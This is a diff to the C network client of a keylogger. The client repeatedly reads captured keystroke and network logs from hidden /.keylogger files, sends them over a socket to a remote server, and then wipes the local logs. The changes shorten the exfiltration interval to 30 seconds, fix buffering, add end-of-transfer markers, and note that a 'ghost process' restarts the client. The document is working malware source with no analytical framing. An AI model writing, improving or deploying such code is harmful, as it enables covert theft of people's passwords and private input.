@@ -1,9 +1,10 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 
 #include "client.h"
 
-#define BUFFER_SIZE 4096
+#define BUFFER_SIZE 2000
 
 void start_client(void)
 {
@@ -33,44 +34,50 @@ void start_client(void)
     if (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0) {
         perror("Error establishing connection\n");
         close(sock);
-        exit(0);
+        return;
     }
     printf("Connecting to server...\n");
-    
-    while(1){
-        sleep(180); // wait 180sec = 3 min before sending logs again
-        
+
+    ssize_t read_size;
+    while(1) {
+        sleep(30);
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
         FILE *keylog_log = fopen("/.keylogger/log/keylog.txt", "r");
         /*Write keylog file*/
-        while(fscanf(keylog_log,"%s",send_buffer) != EOF)
+        while(fgets(send_buffer, BUFFER_SIZE, keylog_log) != NULL)
         {
-            if(ret == (write(sock, send_buffer, sizeof(send_buffer))<=0)){
+            if(write(sock, send_buffer, strlen(send_buffer)) < 0){
                 perror("Error writing keylog log\n");
                 close(sock);
+                // Alright to exit because ghost process will start
+                // it up again.
                 exit(0);
             }
         }
-        /*Clear and close keylog file*/
-        fclose(fopen("/.keylogger/log/keylog.txt", "w"));
+        write(sock, "_end", 4);
+       /*Clear and close keylog file*/
+       fclose(fopen("/.keylogger/log/keylog.txt", "w"));
+
        sleep(5);
+
        memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
        /*Open network_log file for writing*/
        FILE *network_log = fopen("/.keylogger/log/network.txt", "r");
        /*Write keylog file*/
-       while(fscanf(network_log,"%s",send_buffer) != EOF)
+       while(fgets(send_buffer, BUFFER_SIZE, network_log) != NULL)
        {
-           if(ret == (write(sock, send_buffer, sizeof(send_buffer))<=0)){
+           if(write(sock, send_buffer, strlen(send_buffer)) < 0){
                perror("Error writing network log\n");
                close(sock);
+               // Alright to exit because ghost process will start
+               // it up again.
                exit(0);
            }
        }
+       write(sock, "_end", 4);
        /*Clear and close keylog file*/
        fclose(fopen("/.keylogger/log/network.txt", "w"));
-    }
+   }
     close(sock);
 }
-
-
